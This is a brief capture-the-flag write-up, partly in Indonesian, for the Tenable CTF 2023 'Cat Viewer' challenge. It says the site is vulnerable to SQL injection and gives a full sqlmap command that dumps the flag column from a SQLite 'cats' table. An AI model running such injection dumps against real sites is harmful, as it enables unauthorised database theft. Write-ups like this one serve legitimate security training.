# Cat Viewer

> I built a little web site to search through my archive of cat photos. I hid a little something extra in the database too. See if you can find it!

> https://nessus-catviewer.chals.io/

![](https://github.com/muhammadhendro/CTF-Writeups/blob/master/2023/Tenable%20CTF%202023/Cat%20Viewer/Screenshot%202023-08-17%20214538.png)

Ya website ini terdapat celah pada SQLi, langsung saja gunakan sqlmap untuk mencari flag pada database

```
sqlmap -r req.txt -T cats -C flag --dump --level 2 --risk 2 --dbms=SQLite --technique=BEUS
```
